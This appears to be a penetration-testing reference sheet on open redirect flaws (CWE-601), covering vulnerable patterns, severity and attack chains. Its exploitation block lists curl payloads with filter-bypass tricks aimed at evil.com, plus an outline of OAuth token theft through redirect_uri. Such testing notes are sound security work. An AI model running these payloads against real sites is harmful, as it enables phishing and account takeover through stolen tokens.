# Open Redirect

## What it is

Application accepts a user-controlled URL/path and redirects the browser
to it without validating the destination. Enables phishing (victim trusts
the original domain) and OAuth token theft.

**CWE**: CWE-601 (URL Redirection to Untrusted Site)

## Common patterns

- `Location: {user_input}` in 3xx response
- `window.location = params.get('next')` (client-side)
- Login/logout redirect: `/login?next=/dashboard` → `/login?next=https://evil.com`
- OAuth callback: `redirect_uri=https://evil.com`
- Email unsubscribe links, password reset links with return URL
- Meta refresh: `<meta http-equiv="refresh" content="0;url={input}">`

## Exploitation

```bash
# Basic
curl -sI "$TARGET/redirect?url=https://evil.com" | grep Location

# Protocol-relative bypass
curl -sI "$TARGET/redirect?url=//evil.com"

# Encoded
curl -sI "$TARGET/redirect?url=https%3A%2F%2Fevil.com"
curl -sI "$TARGET/redirect?url=https://evil.com%2F..$TARGET"

# Subdomain confusion
curl -sI "$TARGET/redirect?url=https://evil.com?$TARGET"
curl -sI "$TARGET/redirect?url=https://$TARGET.evil.com"

# Backslash trick
curl -sI "$TARGET/redirect?url=https://evil.com\@$TARGET"
curl -sI "$TARGET/redirect?url=/\evil.com"

# JavaScript scheme (client-side)
curl -sI "$TARGET/redirect?url=javascript:alert(1)"

# OAuth token theft
# 1. Register app with redirect_uri pointing to attacker
# 2. Craft authorize URL: /oauth/authorize?redirect_uri=https://evil.com/callback
# 3. Victim's auth code/token sent to attacker
```

## Evidence requirements

- **Demonstrated**: browser follows redirect to attacker-controlled domain
  (capture the 3xx + Location header, or client-side navigation)
- Chain with OAuth: show the token arriving at attacker URL
- Screenshot of browser showing trusted domain → attacker domain transition

## Severity

| Variant | Severity | Condition |
|---|---|---|
| Open redirect alone | Low-Medium | Phishing vector only |
| Open redirect in OAuth flow → token theft | High | Captures auth code/token |
| Open redirect + SSRF chain | High | Internal URL access |
| Client-side redirect to javascript: | Medium | XSS equivalent |
| Open redirect in login flow | Medium | Credential phishing |

## Chains

- Open redirect → OAuth token theft → account takeover
- Open redirect → SSRF (if server follows the redirect internally)
- Open redirect → phishing (increases credibility of phishing page)
- Open redirect → XSS (via javascript: scheme or data: URI)
- Open redirect → header injection (CRLF in redirect URL)
